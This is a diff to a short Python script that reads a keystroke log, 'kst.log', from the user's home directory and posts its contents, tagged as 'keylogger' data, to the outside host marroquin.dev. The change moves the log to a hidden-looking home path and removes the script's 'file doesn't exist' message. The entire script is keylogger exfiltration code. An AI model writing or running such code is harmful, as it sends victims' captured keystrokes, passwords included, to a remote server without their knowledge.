@@ -1,19 +1,20 @@
 from urllib import request
+from pathlib import Path
 import json
 import os
 
-FILE_NAME = "keystrokes.log"
+FILE_NAME = "{0}/kst.log".format(str(Path.home()))
 
 if os.path.exists(FILE_NAME):
 
   file = open(FILE_NAME, "r").read()
 
-  newConditions = {
+  arrayData = {
     "data": file,
     "type": "keylogger"
   }
 
-  data = json.dumps(newConditions).encode('utf8')
+  data = json.dumps(arrayData).encode('utf8')
 
   req = request.Request(
     "https://marroquin.dev/api/tests",
@@ -24,6 +25,3 @@ if os.path.exists(FILE_NAME):
   )
 
   resp = request.urlopen(req)
-
-else:
-  print("The file {FILE_NAME} doesn't exists")
